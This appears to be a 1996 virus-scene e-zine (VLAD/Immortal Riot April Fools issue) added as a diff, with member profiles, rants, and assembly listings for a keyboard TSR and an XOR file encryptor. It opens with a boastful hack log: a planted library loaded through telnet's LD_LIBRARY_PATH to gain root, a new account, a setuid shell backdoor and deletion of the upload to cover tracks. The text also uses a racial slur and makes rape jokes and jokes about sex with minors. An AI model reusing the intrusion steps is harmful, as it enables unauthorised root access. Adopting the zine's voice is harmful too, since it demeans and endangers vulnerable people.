@@ -1,0 +1,2176 @@
+Crazy Ass Niggas stealin' our ideas!! by Quantum / VLAD
+-------------------------------------------------------
+
+I was contacted on irc by someone who didn't identify himself.  He told 
+me that IR was also writing an April Fools edition.  I was astonished.  
+They had blatantly stolen our idea and I knew something had to be done.  
+So I hacked their site and what did I find ?  An almost complete magazine!!
+I knew then that I had to downloaded it and show it in our issue before they 
+could release it.  Here is a log of the hack:
+
+----------------------------------------------------------------------------
+
+vlad:~# ftp ftp.immortal.se
+Connected to ftp.immortal.se.
+220 Immortal FTP server (Version wu-2.4(4) Sat Mar 24 14:37:08 EDT 1996) ready.
+Name (vlad:root): anonymous
+331 Guest login ok, send your complete e-mail address as password.
+Password: 
+230-Welcome, archive user!  This is an experimental FTP server.  If have any
+230-unusual problems, please report them via e-mail to root@Immortal
+230-If you do have problems, please try using a dash (-) as the first character
+230-of your password -- this will turn off the continuation messages that may
+230-be confusing your ftp client.
+230-
+230 Guest login ok, access restrictions apply.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls
+total 8
+drwxrwxrwx   8 root     users        1024 Dec 13 07:38 .
+drwxrwxrwx   8 root     users        1024 Dec 13 07:38 ..
+drwxr-xr-x   2 root     wheel        1024 Apr 29  1995 bin
+drwxr-xr-x   2 root     wheel        1024 Apr 29  1995 etc
+drwxrwxrwx   2 root     wheel        1024 Apr 29  1995 incoming
+drwxr-xr-x   2 root     wheel        1024 Apr 29  1995 lib
+drwxr-xr-x   2 root     wheel        1024 Apr 29  1995 pub
+drwxr-xr-x   3 root     wheel        1024 Apr 29  1995 usr
+-rw-r--r--   1 root     root          312 Aug  1  1994 welcome.msg
+226 Transfer complete.
+ftp> cd incoming
+250 CWD command successful.
+ftp> send libc.so.4
+200 PORT command successful.
+150 Opening BINARY mode data connection for libc.so.4.
+226 Transfer complete.
+634880 bytes sent in 2.68 secs (2.3e+02 Kbytes/sec)
+ftp> bye
+221 Goodbye.
+vlad:~# telnet
+telnet> env define LD_LIBRARY_PATH /home/ftp/incoming
+telnet> env export LD_LIBRARY_PATH
+telnet> o immortal.se
+Trying 351.227.61.23...
+Connected to immortal.se.
+Escape character is '^]'.
+
+Linux 1.2.13 (immortal.se) (ttyp0)
+
+
+Immortal login: crank
+Password: 
+bash# cd /root
+bash# ls
+ir-mag#7.zip      ppp             Mail             mail
+ir-mag#6.zip      ir-mag#5.zip    ir-mag#4.zip     ir-mag#3.zip
+ir-mag#2.zip      ir-mag#1.zip    FEWL.ASM
+bash# /sbin/adduser
+
+Adding a new user. The username should not exceed 8 characters
+in length, or you may run into problems later.
+
+Enter login name for new account (^C to quit): vlad
+
+Editing information for new user [vlad]
+
+Full Name: vlad
+GID [100]: 
+Group 'users', GID 100
+First unused uid is 506
+
+UID [506]: 
+
+Home Directory [/home/vlad]:
+
+Shell [/bin/bash]: 
+
+Password [vlad]: 
+bash# cp /bin/sh /home/vlad
+bash# chmod u+s /home/vlad/sh
+bash# cp FEWL.ASM /home/vlad
+bash# chown vlad /home/vlad/FEWL.ASM
+bash# rm -f /home/ftp/incoming/libc.so.4
+bash# exitConnection closed by foreign host.
+vlad:~# ftp ftp.immortal.se
+Connected to ftp.immortal.se.
+220 Immortal FTP server (Version wu-2.4(4) Sat Mar 24 14:37:08 EDT 1996) ready.
+Name (vlad:root): vlad
+331 Password required for vlad.
+Password:
+230-Please read the file README
+230- it was last modified on Thu Feb 22 18:41:34 1996 - 35 days ago
+230 User vlad logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> get FEWL.ASM
+200 PORT command successful.
+150 Opening BINARY mode data connection for FEWL.ASM (60916 bytes).
+226 Transfer complete.
+60916 bytes received in 0.406 secs (1.5e+02 Kbytes/sec)
+ftp> bye
+
+----------------------------------------------------------------------------
+
+And now, the moment you've all been waiting for:
+
+----------------------------------------------------------------------------
+
+% IR8 - April Fewl - Do you really believe me? %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Welcome back to yet another issue of the Insane Reality!
+This is our 8th issue, of many, many more! 
+
+Immortal Riot is back in da house, giving you a slight idea of what's
+going on in the scene, the real world, our own minds all more or less 
+located in one evil place known as the world, included in the entity by 
+humans refered to as nothing else but the universe.
+
+As usual a lot of things have happened since the last issue that was
+released somewhere back in december in the dormant, dozy and kind of
+drastic drat year, attributed by the four integers, '1', '9', '9', & '5'.
+Nonetheless we haven't got much feedback from it so I guess noone really 
+gives slightly more than a fuck anyways.
+
+Let's start with what seems to be the major news for some pretty if not 
+exactly mega suprised people out there doing shits in the land by idiots 
+refered to 'of nod'.
+
+IR which you should know is an abbreviation for Immortal Riot has stopped 
+being what some people probably would refer to as 'racists' which
+leads us to a position where we no longer have to discriminate people for 
+their origin. Ever since our previous issue was released, IR has been
+wide open as a horny and wet pussy so folks from countries other than Sweden 
+have been allowed to put their dicks into it. Gentle penetration aside, don't 
+seduce me I prefer it the rapist way.
+
+Sure, we never did discriminate who our viruses victimized so why would be 
+discriminate the one making them? Swedish or not, I hope we'll continue 
+bringing you all juicy fruits of what the perverted assembler compilators 
+can generate. My own tree planted not in the garden but in my very own
+territory hasn't though given many fruits lately. What it needs is perhaps
+more water and less booze. Who knows? Who *really* cares?
+
+The first international member to be accepted was Absolute Overlord a
+former member of VLAD. Let alone group-politics/jumping, this guy
+is great. Not only did he drag me into a deep-as-an-ocean-sad-
+as-a-dull-gray-high-way discussion for three hours, didn't IRC for
+an awful long time, left VLAD, he also had enough balls to ask for
+membership in a [then] solely swedish group.
+
+Sure he got accepted by no other than me since everyone thinks I'm
+some sort of leader/head for the group. I wish him good luck in our
+group et cetera as well with bloody-red-roses. Paradoxial behaviour,
+so many girls, so many lies.
+
+After this news got public another guy kind of asked for membership
+in our [not-so] tiny group. Just like AO should ring a bell, Sepultura
+should sound familiar to most of you. Sure, it ain't no double-handle,
+it's the real Mccoy.
+
+Consider both AO and Sep being ex-VLAD'ers, wtf, IR is ripping ex-VLAD members?
+The connection IR & VLAD had always been tight so I guess this was more of
+a coincidense than group-bitching. VLAD is my one favourite group, I wouldn't
+like to bitch with them.
+
+For your information by the way, I even wrote a "VLAD dedicational
+chapter" at this entry, but erased it. I just couldn't find proper
+words to describe/express what needed to be said and decided against
+saying anything at all.
+
+What more can be said about our new members? Yea! There is another guy
+who joined very shortly after IR#7. His handle is Liquid Jesus and is
+an eleete swedish coder. Therefor I would like to do some advertising 
+for our new, but also old members who you sure have forgotten all about
+due to our own laziness. Self-congratuation aside, this is byte-wastening. 
+Enjoy!
+
+The Unforgiven,
+
+A circus 20 year old individual who tends to write heaps of shit for
+Insane Reality (an electronic so called underground publication
+started by himself in the middle of 1993) and other zines. If people
+read his shit or not is to him beside the point. What is done is
+done and is hard to undo.
+
+At the minute this text is being typed he's working with economics 
+for a company located somewhere in the south-west of Sweden. A job which 
+pretty much alike all other swedish jobs for young-adults is a temporary one 
+and didn't last very long. After that (on april the first) he'll start on a 
+two month long education to learn how to use computers, a project involving 
+his local police department. After that he will probably continue (or atleast 
+try to continue) with his ordinary studies or just float around killing time 
+doing shits.
+
+Most of the time he seems to think high thoughts about himself and
+blame failures of any kind on circumstances rather than a his very
+own person. Lacking or not, he puts it as "I am what I am and
+therefor I am", which shows his silly interest in quatation-mutation 
+and word toying.
+
+Like a manic depressive person he has strong up and downs talking
+about the emotional state in his mind. He expresses them both 
+with a shitload of laughs since he find it as good as crying.
+Crying is one way of expression he dislikes not being able to make come 
+true. There is however a slight different in the accent talking about
+laughs.
+
+He refers to himself to as a emotionally disturbed person due to the
+reason that he cannot feel hate. His handle somewhat reflects that a
+person cannot forgive him and if the person is himself or someone else
+is since long forgotten or perhaps repressed. Therefor personal hate
+might exist afterall, beyond his own consciousness. 
+
+Betrayals, lies and broken promises is though heredity, he can 
+hate but he think it's important to distinguish personal hate and
+actions practiced by persons.
+
+Socially this guy is not complicated. He like drinking beers, sitting in a 
+caf‚ smoking marlboro's talking about meaningless and meanfull things in
+life with interesting or annoying persons. The other people listening
+to him tend to be girls and younger.
+
+Despite his self-confident (a word he had to look up in the english
+dictionary (see also: self-assured, cocksure)), he find it
+no fun describing himself as noone because that is the only word
+you can use to describe an unemployed person in the cold country where
+he lives.
+
+There is so many more things that can be said about this person, things
+that want to be said, but won't et cetera. I leave that up to 
+you to find out since he's reechable on both email/IRC and is an open
+person and you shouldn't have a hard time to discussing whatever you want
+with him.
+
+Ordination: Stop smoking and thinking.
+
+Metal Militia,
+
+MMIR as he refers himself as is a 18 year old computer guy who has
+been raised and born with computers and such. He's still a student
+and seem to have no clue what he's about to face in real life after 
+the easy time studying technology science somewhere in the south-west 
+of Sweden. I guess he'll be suprised of the evil nature of girls.
+
+He likes sleeping a lot and is perhaps a too tired person. Despite this,
+he's a good mate. Opinions float openly on the phone when you talk 
+with him and you can tell that there's some thinking behind them.
+
+He dress in pure black clothes and boots. I just wonder why he won't
+color his hair pure black as a punk should do and wear a t-shirt
+saying 'Immortal Riot'.
+
+He always enjoy a cold coke, but cannot smoke properly since he always
+coughs when he tries to take smoke down in his lungs. The same brand
+Pengo and guys smoked.
+
+Unlike The Unforgiven this person likes discussing the scene
+rather than personal things over the IRC, I'm sure he can be reeched
+there if you try hard enough.
+
+Ordination: In and out in Monica for four hours!
+
+Raver,
+
+Raver is a 22 year old ordinary guy. He is has never been and will
+never be a member of the virus-community.
+
+Raver is no longer a viruswriter and has only written four viruses
+which might have taken him about twenty hours of coding all togheter.
+Despite this fact, he's a member of Immortal Riot. Maybe because he's
+one of The Unforgivens' best on personal basis friends.
+
+Raver is still a studying for two educations at the same time with excellent
+results. He's in one word brilliantly loaded with a very sharp mind. On his
+free time he does some programming jobs to get money for the rent and booze.
+
+He likes to dress tidy, listen to english pop-bands like Oasis and its ilk,
+drink coffee and always tend to be the last person to stop drinking beers 
+at parties of any kind.
+
+He is always willing to accept a new challenge just to prove you wrong
+and himself correct. Mothafucka.
+
+Ordination: #4 Turn up the volume!
+
+Conzouler,
+
+Conzouler is 19 years old and studing his very last year on his
+current education. He will probably continue studying after the summer,
+or use his brain in one way or another.
+
+He likes explosives and think technology is more important than bridges ;).
+Beside this fact he seem to have no problems (talking about moral) to decieve 
+15 years old girls with steady relationships in the woods.
+
+Although he has a keen interest in computer viruses and programming in
+general, he's also facinated about "real-life" viruses and needless to say
+he also study them and such.
+
+Conzouler is perhaps by nature a true hacker. He does what needs to be done
+in one way or another, the most important think to him seems to be to
+accomplish the task.
+
+If you want to get in touch with this guy, leave a message on his
+answering machine. 
+
+Ordination: Go camp!
+
+Red-A,
+
+I wish Red-A no further worries in life and decided to reveal no details 
+about this person since he won't deserve more shit. He's seems to be one
+interesting person.
+
+Ordination: Absolut Citron!
+
+Blonde,
+
+Blonde is a 20 year old. He's located in the capital city of Sweden,
+Stockholm. Blonde or Bln as he puts it has like his kid sister a very 
+strange accent.
+
+This person likes to talk much which in general meanings is a good quality. 
+But consider this cocky fellow has no shame whatsoever and tell you that you 
+most likely are blind in front of the person you're trying to hit on. Not
+really the way to go if we should describe it gentle :). (Go bent!)
+
+(that was me, muthafucker! ;P) -rb
+
+Blonde has a friend called Movitz who atleast once has crashed and collapsed
+before the other people got decently drunk. Those two persons like
+going out with their (so called) car, smoking strong cigarettes, talking on
+cellular phones, being a general nuicance and menaces to society :).
+
+Blonde is working on a temporary job. He got fired from his pervious job due 
+to reasons I won't go into here, but he think's he's better off that way.
+I think not.
+
+At the age of 16 he lived with a 10, (-T-E-N-) year older lady for about
+nine month. I guess they'd a lot of sex and sincerly hope it was a 
+relationship based on true abuse. Age gaps aside, he won't approve on
+younger girls and will if he get the chanse to harass you if you think
+different than him.
+
+Despite all negative words written above, Blonde is really funny and
+is with no doubts a good friend.
+
+If you want to get in touch with Blonde, better think again <evil grin>.
+
+Ordination: Falcon & Marlboro lights.
+
+Billy The Kid,
+
+This guy is the youngest guy in the group. He's like 16-17 years old,
+and is of course still a student. I think he has a steady relationship with 
+a girl called Emma and think of himself as a sex-God. No doubt the 
+relationship is build on nothing but teenage sex. "It is painful, but it's 
+suppose to be painful", right?
+
+Btk also lives in Stockholm and tends to be out most of the time, making him
+very hard to get in contact with. There were rumours on the IRC that this
+perverted toy-boy would release a gif collection on himself <shiver> and on 
+his gf (would be neat, though). I hope these rumours were a joke :-), like
+the one saying Conzouler was a 14-year-old-rapist and imprisoned for it. 
+
+Well, this info is nearly a year old :). I have no idea how this person
+is since I never did bother to visit Stockholm.
+
+Ordination: 50 kilos of tennage sex per day.
+
+Liquid Jesus,
+
+Liquid Jesus is a 20 year old student/programmer/guy-who-is-doing-
+his-military-service and stuff.
+
+I've known him during my scene time as a funny sick-minded, albeit kind of 
+brilliant guy with a twisted, paradoxial humour which somehow doesn't 
+make sense at all. Besides making me laugh, he always tends to re-program
+my mind thinking that it's my duty in life to bring the worst out of
+myself. Way to go.
+
+I have only meet this person once three years ago. He has one great
+ego and lives in the funky part of sweden :). (that is not Stockholm). 
+
+I bet he likes to laugh.
+
+You'll hear more about this person, sometime. 
+
+Ordination: Jenka. 
+
+Absolute Overlord,
+
+Absolute Overlord is from the US of A and is what I think around 23 years old.
+I haven't got much information except that he's like, nice. Too nice
+perhaps consider nice people tend to get abused.
+
+Ordination: Learn to love to hate.
+
+Sepultura,
+
+Sepultura is an Australian guy of (to me) unknown age. 
+He's a #virus regular and one horrible person who made me
+release IR7 before the year 7d0h ;).
+
+Get on irc sometime, /msg him and tell him that he's cool!
+
+Ordination: TASM.
+
+I think that's the members in Immortal Riot. If you aren't listed,
+consider yourself forgotten.
+
+Now, a news-update might be in order or so but since not that much
+has happend (group-news), I only bother to document a few lines which
+I ripped straight out from a "thought-to-be-introduction" for IR8, written
+somewhere in Feb, 1996. It was by the way only send out to Omega and should
+since long be forgotten.
+
+% Busting-time %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+The rumours saying that I'd been busted wasn't true. You confused the
+information I send in the fuck.nfo file. The Wizard got busted. He
+got fired from his job and the police searched his apartment and wanted
+to have his bbs-computer to grab all other "scums" out there producing
+viruses and stuff. Touch luck. He got a HD-crash and they wouldn't find
+much information about us except what they'd been able to collect from
+monitoring him on the IRC/email.
+
+Blonde who also worked at the same place, got called to the
+boss, who asked him (already knowing the facts though, just needing
+some sort of confession) about "virus-things". Well, you guessed it,
+he also got fired. 
+
+The 'funny' thing was that I also got fired the very same day as The Wizard 
+was. The two incidents had nothing to do with eachother. Three IR-members
+loosing their job in such a short period. Or maybe it was four, who
+knows, who really reads this? :).
+
+That's much for the news.. Same old, same old!!
+
+% Burn me, Kill me then Rape me %
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+I felt like I also had to document the rotten part of the scene,
+life and all that. Well, I didn't have to wait long for getting enough
+material to publish one book named "The evil that man does", or with some
+equal title which would reflect the hard reality some are forced to face, 
+while other bring it to them. 
+
+While some people are filling other people lifes with shit, alternative 
+making their life as empty as a unwritten paper converting every good 
+memory stored in the mind of the uninitiated to be nothing but pure and 
+complete meaningless serie of true abuse, broken promises, cruel betrayals,
+and general bitching, you just can't stop plaguing your mind with questions 
+like "What gives them that right?". 
+
+But rather than writing an entire book which none but suicidal perverts 
+would read, I spared a column for a virus(!) oriented zine, namely this.
+So, therefor unhappy as a lost schlut(what the fuck is the correct spelling
+for the alternative bitch-word anyways?) somewhere in cyberspace can be,
+I sadly present:
+
+"Life to Death and the shit in between % 
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+	      - or -
+
+"TORMENTED-ON-EARTH-UNTIL-DEATH-DO-US-APART". 
+
+	  - alternative - 
+
+    "How could hell be any worse?"
+
+
+Part 1d/1h.
+
+On the 25 of January, 1996 - one of Lord Lucifer's offsprings, if not
+the devil himself sneaked out from his cage known as hell and decided to 
+have one good time making my life miserable. Well, you can always trust
+evil to win, meaning I am good and didn't deserve that.
+
+Sure, it's happened before and will most likely happen again.. Voila
+deja-vu on you too! Things crash and it is of course painful when things
+crash. It is suppose to be painful when things collapse but the question 
+is just how painful is it suppose to be?
+
+While drinking my morning cup of tea I had no idea this would put
+me and my life in a direction I could no longer control nor feel
+very strong feelings for. I know shit is suppose to happen, but why does
+it all have to happen in a period of a few hours? 
+
+(* Err, this is getting boring, seek for 'HAHA' in your text-editor
+   and skip this. If you like getting bored, please continue.. *)
+
+This is such a time of life when the thought "If I won't wake up the
+next morning, I won't even care" didn't seem very strange at all. Would
+kinda be a relief really. People wouldn't then be able to hurt you anymore. 
+You would have nothing to worry about ever. But on the other hand, you
+wouldn't have something to look forward to either. Dead end.
+
+I won't go into all the ins and outs of what really happened, but it's
+such a day when you really like to cry out loud and painfully to
+then forget all about it. But what if you can't cry or forget it?
+You want to hate, but can't. If love cannot turn to hate in a matter
+of a split second, that indicates that you're weak and oh-so-very-volnerable.
+
+I can hear my heart scream it loud, I can feel my left breast being torn 
+apart. I feel negative love, but want to feel hate. 
+
+[Etc. It did continue, but I it all sudden got too damn personal, I
+had to remove that since people might read this. Often, I publish
+personal things in Insane Reality since noone reads the text inside
+those long stupid articles anyways :)) 
+
+And besides, this is getting old. Only spiritual wounds remains. ].
+
+--- End of the meaningless story ---
+
+HAHA!
+
+Anyways.. 
+
+I reckon I talked about jobs (arbeit-macht-frei!) above. That in itself is 
+quite interesting. If you have no documented knowledge, you ain't shit. If 
+you don't have a job, you are noone.
+
+When you talk to strangers, the first thing they will say is their
+first name and their job, like this:
+
+(* assumed name for me is Daniel *).
+
+>>Hi am am Jessica and *I AM* a system-manager,
+>>and you are?
+
+>Well, I'm Daniel.
+
+[You give out your name, but that ain't enough, if you don't say what
+ you do, or where you work]
+
+>>Yes? 
+
+[ They wait a few seconds since they expect that you should say what you   ]
+[ work with. If you don't, they've figured you're unemployed               ] 
+[ or a person who has a shitty job and once they realize this they get this] 
+[ evil malicious grin on their lips and reply... (assuming they already    ]
+[ know the answer though).]
+
+>>and, what do you do?
+
+[Alternativly]
+
+>>*and you are?*
+
+I remember this once happend to me and I started to think about it and 
+came to this result:
+
+If you have a job, you're someone and you have your very own identity.
+You can be categorized into a group, you belong to a group of certain 
+other people. If you won't have a job, you have no identity partly because
+you cannot be placed somewhere and belong nowhere.
+
+Everyone sees themself as a contributor to the society and if you don't
+support the society you and your personality just ain't good enough and
+you can go fuck yourself and come back when you've grown up.
+
+I remember one person asked me "and you are", in a quite equal situation as
+the one described above to whom I replied "I already told you, I'm Daniel". 
+She like got like suspicious thinking I was stupid not answering on the 
+question which would be read "And what do you do for living?". 
+
+That was also the time, when I sat down saloon-drunk and came up with the 
+quotation:
+
+"I am what I am and therefor I am",
+
+So, I figured this,
+
+At the age of 20 (or whatever), the only person you have to be is yourself.
+You are someone because you've find yourself and know how you *are*, not
+because of what you do. Period.
+
+Anyways,
+
+in a further study concering jobs and such I decided one day to 
+see what a hard-ass-worker with a decent payment (100 US$ / hour) does for 
+living and what other persons thought about his job. I studied him doing 
+(in other persons eyes) 'magic' with computers and I also got the chance
+to look at a program he developed. More about that specific program later.
+
+I did some detective job to see what this person had done during
+the last years and read the theory of why he was contacted in the first
+place.
+
+The reason why he was needed was to write a program that didn't exist
+at that time. Sure enough he told them it wouldn't take long/cost much,
+et cetera :). Ha-ha, funny guy :).
+
+He has ever since he developed the program (one month programming-project
+or so, right? Not.), a position where they were dependant on him.
+
+He had to teach them his stupid programs, configure their computers,
+buy hardware, etc. Sure, that's nothing terrible with that, but if
+you look at what has been done to which price you'll get suprised.
+
+To name a few incidents I found:
+
+He had to make a batch file which would copy file into a directory
+he created. Err.. that is like 20 seconds, not one hour as it took
+him in the payment check.
+
+He had to install a macro in winword, (whoah!) 4 hours.
+
+He had to remove *one* line in the program, this one incident took 
+him 20 hours. Of course, he had to find it, too :>. Ever since his
+program would be ready, there has been *a lot* of bug-fixes. Woops,
+wasn't that included in the price, too?
+
+[etc. etc. This list could go on and on and on and on.. ]
+
+Why did he had to do all this?
+
+It's really simple. Their very own computer-use is beyond their 
+knowledge. Isn't it clever to make it in a way noone else will
+understand what you've done? 
+
+They can't alter shit. They're dependant on him and so it continues..
+
+Is this so very respectable? Is this lower than having no job?
+It's like stealing money from them and at the same time get thanked
+for it. From who did exactly I steal from? For who am I a burden?
+
+Now to the brilliant program,
+
+The program which follows is one solution he came up with and what it
+cost is beyond me, but I know that he earned more than 5000 USD for less
+than one week of job, so trivial and easy you got amazed why they would
+even pay him one crown.
+
+This program is a resident program which hooks the keyboard interrupt and will 
+intercept if a comma (',') on the numeric-keyboard when num-lock is active and
+if so, write a dot ('.') rather than the comma.
+
+First we have a look at the code.
+
+[ I did never bother to look things up because the code is so tiny so if  ]
+[ you have a keen interest in the progam itself go get the correct info.  ]
+[ Credits for disasm-program goes out to V-communication.                 ]
+--------------------------------------------------------------------------------
+Period.139.
+----------
+
+.model tiny
+.code
+org    100h
+
+
+keybd_q_head    equ     1Ah
+keybd_q_tail    equ     1Ch
+keybd_queue     equ     1Eh
+comma           equ     532ch
+dott            equ     532eh
+
+start:          jmp     short get9
+		nop
+
+org9            dd      0
+
+new9:           sti                             
+		pushf                   
+		call    cs:org9
+
+		push    ds
+		push    ax
+		push    bx
+		mov     bx,40h
+		mov     ds,bx
+		mov     bx,ds:keybd_q_tail
+		cmp     bx,ds:keybd_q_head
+		je      no_match
+		sub     bx,2
+		cmp     bx,keybd_queue
+		nop                            
+		jae     keep_bx
+		mov     bx,(keybd_queue*2)
+keep_bx:        mov     ax,[bx]
+		cmp     ax,comma
+		jne     no_match
+		mov     ax,dott
+		mov     [bx],ax
+no_match:       pop     bx
+		pop     ax
+		pop     ds
+		iret                            
+
+handler_size    equ     $ - new9
+
+get9:           mov     ax,3509h
+		int     21h             
+						
+		mov     word ptr cs:org9[0],bx
+		mov     word ptr cs:org9[2],es
+		mov     di,bx
+		mov     si,offset new9
+		mov     cx,handler_size
+		repe    cmpsb                   
+		jnz     not_tsr         
+
+		mov     dx,offset is_resident   
+		mov     ah,9
+		int     21h                     
+		int     20h             
+
+not_tsr:        mov     dx,offset new9
+		mov     ax,2509h
+		int     21h                     
+
+		mov     dx,13Ch                
+		int     27h                     
+						
+is_resident     db      'PERIOD:  Already Installed!',10,13,36
+
+end             start
+--------------------------------------------------------------------------------
+I guess I don't need to comment the byte-optimizing in itself since it
+take no brain to realize the code stinks. I did a slight rewrite of
+the very same program and managed to shred in percent an awful lot of
+code.
+
+But the most ignorant part of this program is the tsr-part. Why would
+he define DX to hold a larger number than what it has to?
+
+Why wouldn't he use these three lines to make the tsr-size 336 bytes
+rather than 656?
+
+handler_size    equ     $ - new9
+		mov     ah,49h
+		mov     es,word ptr ds:[2ch]
+		int     21h
+get9:           [etc]
+
+Such things are annoying for programmers to see, but workers see only
+the result. Sure, it write's the damn period, isn't it good then?
+I let you make that decision.
+
+Hmmmm,
+
+So, we're writing meaningless programs here? Oh.. Let me demonstrate
+the funky meaningless code part of this article :-). Again, it's april
+the first. I feel like a fewl :-).
+
+comment #
+
+FileEncryptor:
+--------------
+This will encrypt any file below (ffffh - thisprogramsize) bytes making it
+into an executable of the com-style file-format. 
+
+The newly created program can naturally be executed after the data 
+(input-file) has been written as encrypted data with the given key whenever 
+such a request is given to dos. If the right key is given the original
+filename will be written and can be read properly again.
+
+Limits,
+
+In this program the limits are hillariously many. The reason being
+is simple that it never was my intension to write a unbreakable encryptor 
+nor it was thought to be a show-off procucing a program cleverly
+written.
+
+If we would document a few for winusers anyways, annoying things.
+
+þ If you would like to encrypt files larger than about 64kb, 
+  don't use this program :) or style the output file to be
+  an exe-file. To add is that that's a lot harder and I have
+  no such intensions.
+
+þ Don't use backspace when you're definining any data (in/out & key) since
+  that will mess things up.
+
+þ  Don't use this program on files located in some other directory than
+   the current one. The poll_name routine isn't exactly a complete one :).
+
+Warrently,
+
+There is no.
+
+Disclaimer,
+
+Go sue me..
+#
+
+.model tiny
+.code
+org 100h
+
+start:
+    mov ah,9
+    mov dx,offset message2
+    int 21h
+    mov si,offset inputfile
+    call poll_name
+    mov ah,4eh                         
+    mov dx,offset inputfile
+    int 21h
+    jnc inok
+    mov ah,9
+    mov dx,offset indontexist
+    int 21h
+    xor ah,ah
+    int 16h
+    cmp ah,15h
+    je start
+    mov ah,9
+    mov dx,offset leaving
+    int 21h
+    int 20h
+inok:
+    mov ah,9
+    mov dx,offset newline
+    int 21h
+    mov dx,offset message3
+    int 21h
+    mov si,offset outputfile
+    call poll_name
+    mov ah,4eh
+    mov dx,offset outputfile
+    int 21h
+    jc outok
+    mov ah,9
+    mov dx,offset outexist
+    int 21h
+    xor ah,ah
+    int 16h
+    cmp ah,15h
+    je outok
+    mov ah,9
+    mov dx,offset leaving
+    int 21h
+    int 20h
+outok:
+    mov ah,9
+    mov dx,offset newline
+    int 21h
+
+    mov dx,offset message
+    int 21h
+
+    mov si,offset keys
+
+read_keyboard:
+    mov ah,1
+    int 21h
+
+    cmp al,13
+    je finito
+
+    mov byte ptr [si],al
+    inc si
+    inc counter
+    jmp read_keyboard
+
+finito:
+    mov ah,9
+    mov dx,offset newline
+    int 21h
+
+    mov dx, offset enc
+    int 21h
+
+    mov dx,offset takeawhile
+    int 21h
+
+    mov ah,3ch
+    mov dx,offset outputfile
+    xor cx,cx
+    int 21h
+    xchg ax,bx
+
+    mov ah,40h
+    mov cx,offset eof-offset code_start
+    mov dx,offset code_start
+    int 21h
+
+    mov ax,3d00h
+    mov dx,offset inputfile
+    int 21h
+
+    xchg ax,di
+    xchg di,bx
+
+    mov si,offset keys
+    xor bp,bp
+
+read:
+    mov ah,3fh
+    mov cx,1
+    mov dx,offset buffer
+    int 21h
+    
+    xchg ax,cx
+
+    mov al,byte ptr [si+bp]
+    xor buffer,al
+    inc bp
+    cmp bp,counter
+    jne write
+    xor bp,bp
+write:
+    xchg di,bx
+    mov ah,40h
+    int 21h
+
+    cmp ax,1
+    jne ready_reading
+
+    xchg bx,di
+    jmp short read
+
+ready_reading:
+    mov ah,3eh          
+    int 21h
+    xchg di,bx
+    int 21h
+
+    mov ah,9
+    mov dx,offset ready
+    int 21h
+    int 20h
+
+poll_name:
+    mov ah,1
+    int 21h
+    cmp al,13
+    je end_poll
+    mov byte ptr [si],al
+    inc si
+    jmp short poll_name
+end_poll:
+    mov byte ptr [si],0
+    ret
+
+code_start:
+    mov ah,9
+    mov dx,offset message-code_start+100h
+    int 21h
+
+    mov si,offset keys-code_start+100h
+    mov bx,offset counter-code_start+100h
+    mov word ptr [bx],0
+r_k:
+    mov ah,1
+    int 21h
+
+    cmp al,13
+    je fin
+
+    mov byte ptr [si],al
+    inc si
+
+    inc word ptr [bx]
+    jmp short r_k
+
+fin:
+    mov ah,9
+    mov dx,offset dct-code_start+100h
+    int 21h
+
+    mov dx,offset takeawhile-code_start+100h
+    int 21h
+
+    mov ax,3d00h
+    mov dx,outputfile-code_start+100h
+    int 21h
+    xchg ax,bx
+
+    mov ax,4200h
+    xor cx,cx
+    mov dx,offset eof-offset code_start
+    int 21h
+
+    mov ah,3ch
+    mov dx,offset inputfile-code_start+100h
+    xor cx,cx
+    int 21h
+
+    xchg di,ax
+    xor bp,bp
+
+repeat:
+    mov ah,3fh
+    mov cx,1
+    mov dx,offset buffer-offset code_start+100h
+    int 21h
+
+    xchg ax,cx
+
+    mov si,offset keys-code_start+100h
+    mov al,byte ptr [si+bp]
+    inc bp
+    mov si,offset buffer-code_start+100h
+    xor byte ptr [si],al
+    mov si,offset counter-code_start+100h
+    cmp bp,word ptr [si]
+    jb go_on
+    xor bp,bp
+go_on:
+    xchg di,bx
+    mov ah,40h
+    int 21h
+    cmp ax,1
+    jne end_of_repeat
+
+    xchg di,bx
+    jmp repeat
+
+end_of_repeat:
+    mov ah,3eh
+    int 21h
+    xchg di,bx
+    int 21h
+
+    mov ah,9
+    mov dx,offset ready-code_start+100h
+    int 21h
+    int 20h
+
+buffer      db ?                    
+message     db 'Which key shall I use? ',36
+message2    db 13,10,'Enter filename to encrypt: ',36
+message3    db 'Enter destination file (.com): ',36
+newline     db 10,13,36
+inputfile   db 14 dup(0)
+outputfile  db 14 dup(0)
+enc         db 'Encrypting ',36
+dct         db 'Decrypting ',36
+takeawhile  db 'data, this might take a while...',36
+ready       db 13,10,'done!',13,10,36
+indontexist db 'There is no such file! choose another file [Y/n]',36
+outexist    db 'Output file already exist! Overwrite [Y/n]?',36
+leaving     db 13,10,'Leaving this world..',13,10,36
+eof:
+counter     dw 0
+keys        db 10 dup(?)
+
+end        start
+================================================================================
+If you think the above program stinks and tell me that its encryptor
+sucks, enjoy this little challenge!
+
+The debug-script which follows is encrypted with a key only I know,
+but if you crack the encryptor you'll recieve *all* my real info,
+plus the reason why my handle being The Unforgiven. I never bother
+to tell anyone, so see if you can be the first person to know.
+
+May the (brute) force be with you... ;>
+
+		DEBUG < filename
+    (   where filename is the name of this script file.   )
+
+N SECRET.COM
+E 0100 B4 09 BA 8B 01 CD 21 BE BB 02 BB B9 02 C7 07 00
+E 0110 00 B4 01 CD 21 3C 0D 74 07 88 04 46 FF 07 EB F1
+E 0120 B4 09 BA 0C 02 CD 21 BA 18 02 CD 21 B8 00 3D BA
+E 0130 F2 01 CD 21 93 B8 00 42 33 C9 BA B9 01 CD 21 B4
+E 0140 3C BA E4 01 33 C9 CD 21 97 33 ED B4 3F B9 01 00
+E 0150 BA 8A 01 CD 21 91 BE BB 02 8A 02 45 BE 8A 01 30
